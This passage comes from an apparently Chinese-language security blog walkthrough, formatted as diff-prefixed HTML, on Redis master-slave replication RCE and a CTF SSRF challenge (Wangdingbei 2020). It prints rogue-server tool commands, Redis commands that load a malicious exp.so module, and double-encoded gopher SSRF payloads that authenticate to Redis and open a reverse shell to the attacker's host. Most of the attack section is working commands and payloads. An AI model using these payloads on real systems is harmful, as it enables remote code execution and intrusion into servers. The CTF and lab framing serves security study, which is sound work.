+<h4 id="Redis-3-x版本下使用问题"><a href="#Redis-3-x版本下使用问题" class="headerlink" title="Redis 3.x版本下使用问题"></a>Redis 3.x版本下使用问题</h4><p>但是在 redis 3.x 下脚本<code>Awsome-Redis-Rogue-Server</code>选择交互模式会一直报错，同时反弹模式无法反弹回shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.35.10.png" alt="截屏2021-11-01 上午2.35.10"></p>
+<p>而<code>redis-rogue-server</code>可使用反弹模式，但是无法使用交互模式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 192.168.15.129 --lhost 192.168.15.131</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.47.12.png" alt="截屏2021-11-01 上午2.47.12"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.47.31.png" alt="截屏2021-11-01 上午2.47.31"></p>
+<h3 id="本地Redis主从复制RCE"><a href="#本地Redis主从复制RCE" class="headerlink" title="本地Redis主从复制RCE"></a>本地Redis主从复制RCE</h3><p>通过上一节的介绍我们对于主从复制有了一定的了解，目标机器的 redis 可被远程的其他机器登录，执行脚本在内存中写死一些命令，通过这些命令可执行系统命令。那么假如目标机器仅允许本地登陆时，该方法就不适用了。因此我们需要配合其他漏洞从目标本地登录 redis，同时手动执行脚本内写死的一些命令，命令将目标 redis 作为从机，将攻击机作为主机，攻击机会自动将 .so 文件同步给从机，从而实现对目标机器的远程命令执行</p>
+<h4 id="主从复制工具下载-1"><a href="#主从复制工具下载-1" class="headerlink" title="主从复制工具下载"></a>主从复制工具下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/redis-rogue-server //未授权 </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server //有密码</span><br></pre></td></tr></table></figure>
+<p>由于<code>exp.so</code>自带 system 模块，我们需要将<code>redis-rogue-server</code>中的<code>exp.so</code>文件复制到<code>Awsome-Redis-Rogue-Server</code>中</p>
+<h4 id="主从复制RCE-2"><a href="#主从复制RCE-2" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h4><p>在本地监听9999端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 9999</span><br></pre></td></tr></table></figure>
+
+<p>在本地开启 redis 作为主机，为主从同步做准备</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -path exp.so</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.23.53.png" alt="截屏2021-11-01 上午3.23.53"></p>
+<p>在从机上设置导出文件名并开启主从同步导入恶意so</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; module list</span><br><span class="line">redis &gt; config <span class="built_in">set</span> dir /tmp //一般情况下tmp目录具有写权限</span><br><span class="line">redis &gt; config <span class="built_in">set</span> dbfilename exp.so //设置导出文件的名字</span><br><span class="line">redis &gt; slaveof 192.168.15.131 15000 //进行主从同步，将恶意的so文件导入tmp文件</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.26.26.png" alt="截屏2021-11-01 上午3.26.26"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.26.34.png" alt="截屏2021-11-01 上午3.26.34"></p>
+<p>加载恶意模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; module load ./exp.so</span><br><span class="line">redis &gt; module list //主要看有没有system</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.28.51.png" alt="截屏2021-11-01 上午3.28.51"></p>
+<p>执行反弹命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; system.rev 192.168.15.131 9999</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.30.05.png" alt="截屏2021-11-01 上午3.30.05"></p>
+<p>也可以直接运行系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; system.exec <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.32.30.png" alt="截屏2021-11-01 上午3.32.30"></p>
+<p>关闭主从同步（在主机或从机上关闭都可）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis &gt; slaveof NO ONE</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.28.05.png" alt="截屏2021-11-01 上午3.28.05"></p>
+<h3 id="SSRF-Redis反弹shell"><a href="#SSRF-Redis反弹shell" class="headerlink" title="SSRF Redis反弹shell"></a>SSRF Redis反弹shell</h3><p>网鼎杯2020玄武组SSRF题目</p>
+<h4 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h4><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span> = preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$url_parse</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span> = <span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span> = gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span> = ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="number">20</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">20</span> ||</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span> . <span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>hint.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">1342</span>) <span class="string">&quot; &lt;?php if (<span class="subst">$_SERVER</span>[&#x27;REMOTE_ADDR&#x27;] === &quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;) &#123;</span></span><br><span class="line"><span class="string">    highlight_file(__FILE__);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if (isset(<span class="subst">$_POST</span>[&#x27;file&#x27;])) &#123;</span></span><br><span class="line"><span class="string">    file_put_contents(<span class="subst">$_POST</span>[&#x27;file&#x27;], &quot;</span><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;redispass is root&#x27;</span>;<span class="keyword">exit</span>();<span class="string">&quot; . <span class="subst">$_POST</span>[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>将它们都放入 php 环境的站点中</p>
+<h4 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、绕过条件判断</span><br><span class="line">2、访问hint.php获取redis密码</span><br><span class="line">3、利用ssrf、gopher协议打redis</span><br><span class="line">4、redis主从漏洞反弹shell</span><br></pre></td></tr></table></figure>
+<h4 id="实践测试"><a href="#实践测试" class="headerlink" title="实践测试"></a>实践测试</h4><p>在 index.php 中发现存在本地条件判断绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="number">20</span> == <span class="variable">$int_ip</span> &gt;&gt; <span class="number">20</span> ||</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.27.47.png" alt="截屏2021-11-02 上午2.27.47"></p>
+<p>直接在其后添加本地路径后发现 redis 密码为<code>welcometowangdingbeissrfme6379</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://0.0.0.0/hint.php</span><br></pre></td></tr></table></figure>
+
+<p>经过测试发现该 redis 数据库只允许本地登录，尝试通过本地主从复制的方式拿到目标权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.30.37.png" alt="截屏2021-11-02 上午2.30.37"></p>
+<p>首先设置本地监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6379</span><br></pre></td></tr></table></figure>
+
+<p>开启主服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost 192.168.0.50</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.40.44.png" alt="截屏2021-11-02 上午2.40.44"></p>
+<p>使用主从复制漏洞进行攻击首先需要设置目录并导出文件名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 192.168.0.50 21000</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>经过 url 双层编码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.0.50%252021000%250d%250aquit</span><br></pre></td></tr></table></figure>
+
+<p>成功设置导出路径为<code>tmp</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.41.58.png" alt="截屏2021-11-02 上午2.41.58"></p>
+<p>成功设置导出文件名为<code>exp.so</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.45.18.png" alt="截屏2021-11-02 上午2.45.18"></p>
+<p>导入恶意模块<code>exp.so</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>经过 url 双层编码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520./exp.so%250d%250aquit</span><br></pre></td></tr></table></figure>
+
+<p>执行恶意模块 <code>exp.so</code> 进行主从交互<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.50.31.png" alt="截屏2021-11-02 上午2.50.31"></p>
+<p>关闭主从交互</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">slaveof NO ONE</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>经过 url 双层编码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.53.04.png" alt="截屏2021-11-02 上午2.53.04"></p>
+<p>导出数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>经过 url 双层编码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.54.15.png" alt="截屏2021-11-02 上午2.54.15"></p>
+<p><strong>需要注意的是每次操作应在监听处敲个空格</strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.50.45.png" alt="截屏2021-11-02 上午2.50.45"></p>
+<p>尝试反弹shell，在本地开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure>
+<p>执行反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth welcometowangdingbeissrfme6379</span><br><span class="line">system.rev 192.168.0.50 6666</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>经过 url 双层编码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250asystem.rev%2520192.168.0.50%25206666%250d%250aquit</span><br></pre></td></tr></table></figure>
+
+<p>成功收到反弹shell，能够正常交互<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8A%E5%8D%882.57.01.png" alt="截屏2021-11-02 上午2.57.01"></p>
